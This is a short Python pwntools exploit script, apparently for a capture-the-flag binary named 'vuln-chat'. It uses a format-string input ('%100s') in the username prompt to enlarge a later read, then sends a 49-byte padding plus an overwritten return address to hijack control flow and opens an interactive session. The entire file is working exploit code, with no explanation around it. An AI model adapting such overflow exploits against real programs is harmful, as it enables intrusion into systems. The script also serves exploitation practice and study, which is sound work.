#!/usr/bin/python3

from pwn import *

context.log_level = 'ERROR'

context.binary = elf = ELF("./vuln-chat", checksec=False)
p = process()

print(p.recvuntil("username: "))

name_payload = b"A"*20 + b"%100s"
p.sendline(name_payload)

print(p.recvuntil("you?"))

password_payload = b"B"*49 + p32(0x804856b)
p.sendline(password_payload)

p.interactive()
